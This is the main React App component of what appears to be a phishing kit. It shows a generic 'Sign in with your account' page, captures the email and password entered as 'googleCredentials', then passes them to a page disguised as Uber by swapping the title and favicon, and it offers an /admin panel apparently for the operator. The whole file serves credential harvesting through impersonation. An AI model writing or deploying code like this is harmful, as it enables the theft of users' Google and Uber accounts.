import { useState, useEffect } from 'react'
import LoginPage from './LoginPage'
import UberEatsLogin from './UberEatsLogin'
import AdminPanel from './admin/AdminPanel'

function App() {
  const [currentPage, setCurrentPage] = useState<'google' | 'ubereats' | 'admin'>('google')
  const [googleCredentials, setGoogleCredentials] = useState({ email: '', password: '' })

  // Check if URL path is /admin
  useEffect(() => {
    const path = window.location.pathname;
    if (path === '/admin' || path === '/admin/') {
      setCurrentPage('admin');
      document.title = 'Admin Panel';
      return;
    }
  }, []);

  useEffect(() => {
    if (currentPage === 'ubereats') {
      document.title = 'Uber';
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (link) {
        link.href = '/uber.svg';
      }
    } else if (currentPage === 'admin') {
      document.title = 'Admin Panel';
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (link) {
        link.href = '/vite.svg';
      }
    } else {
      document.title = 'Sign in with your account';
      const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (link) {
        link.href = '/vite.svg';
      }
    }
  }, [currentPage]);

  const handleNavigateToUberEats = (email: string, password: string) => {
    setGoogleCredentials({ email, password })
    setCurrentPage('ubereats')
  }

  // Render admin panel if URL is /admin
  if (currentPage === 'admin') {
    return <AdminPanel />;
  }

  return (
    <>
      {currentPage === 'google' && <LoginPage onNavigate={handleNavigateToUberEats} />}
      {currentPage === 'ubereats' && <UberEatsLogin googleCredentials={googleCredentials} />}
    </>
  )
}

export default App
